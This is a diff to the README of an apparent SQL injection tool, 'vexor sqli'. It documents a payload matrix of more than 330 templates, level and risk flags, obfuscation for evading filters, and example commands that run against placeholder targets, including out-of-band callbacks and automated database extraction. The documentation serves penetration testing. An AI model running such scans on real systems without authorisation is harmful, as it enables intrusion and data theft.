@@ -242,6 +242,32 @@ WAF blocks raw data-shaped leaks, extraction degrades to a per-condition
 falls back to schema-agnostic lookups, GitHub-CLI-style WordPress column sets,
 and common-column brute force when `information_schema` is locked down.
 
+Detection is driven by a **version-aware payload matrix** — 330+ original
+templates spanning MySQL, PostgreSQL, MSSQL, Oracle, SQLite and a generic
+cross-DB bucket across all seven technique families. `--level` (1-5) selects
+payload nuance and `--risk` (1-3) filters destructive vectors; `--dbms` narrows
+the set to one backend. Each base template is expanded through a level-aware
+wrapper engine (quote variants, parenthesization, clause contexts, NUL
+truncation, keyword/whitespace mutations), so a single template yields many
+concrete probes. Run `vexor sqli --matrix` to print the full per-DBMS and
+per-technique coverage summary.
+
+**Depth behavior.** `--level` grows both the selected vector set and its
+wrapper variants: level 1 runs only the highest-probability subset (~15-25
+probes per point); level 3 expands to the full matrix across every version
+branch and clause (>100 probes); levels 4-5 add compact keyword/whitespace
+obfuscations that trade coverage for evasiveness. `--risk` gates destructive
+vectors — risk 1 excludes stacked/OOB/heavy-CPU payloads whenever a lighter
+match exists, while risk 3 admits OR-logic, stacked, and heavy-CPU probes.
+
+```bash
+# moderate depth: full matrix, no destructive vectors
+vexor sqli -u "https://example.com/page?id=1" --level 3 --risk 1
+
+# maximum depth + aggressive vectors (stacked, OOB, heavy-CPU)
+vexor sqli -u "https://example.com/page?id=1" --level 5 --risk 3 --oob-domain "att.d"
+```
+
 | Flag | Shorthand | Type | Description | Default |
 |---|---|---|---|---|
 | `--url` | `-u` | string | Target URL, e.g. `https://example.com/page?id=1` | |
@@ -253,6 +279,7 @@ and common-column brute force when `information_schema` is locked down.
 | `--risk` | | int | Payload risk (1-3) | `1` |
 | `--threads` | | int | SQLi concurrency threads | `10` |
 | `--fast` | | bool | Quick pass: level/risk 1, error + union only | `false` |
+| `--matrix` | | bool | Print version-aware payload matrix summary (counts by DBMS/technique) and exit | `false` |
 | `--timeout` | | int | Per-request timeout (seconds) | `8` |
 | `--delay` | | int | Sleep between requests (milliseconds) | `0` |
 | `--retries` | | int | Retries per failed request | `1` |
@@ -275,11 +302,20 @@ and common-column brute force when `information_schema` is locked down.
 | `--file-dest` | | string | Remote path for `--write-file` | basename |
 
 ```bash
+# Print the version-aware payload matrix summary
+vexor sqli --matrix
+
 # Basic SQL injection scan
 vexor sqli -u "http://target.com/page.php?id=1"
 
 # Restrict to error + union techniques on a single parameter
 vexor sqli -u "http://target.com/page.php?id=1" -p id -t "BEU"
+
+# Deeper scan: level 3 unlocks OR / order-by / having wrappers
+vexor sqli -u "http://target.com/page.php?id=1" --level 3 --risk 1
+
+# Full matrix: level 5 + risk 2 (adds time/heavy vectors), non-interactive
+vexor sqli -u "http://target.com/page.php?id=1" --level 5 --risk 2 --batch
 
 # Automated scan + full data extraction (db -> table -> columns on its own)
 vexor sqli -u "http://target.com/page.php?id=1" --auto-tamper --dbs
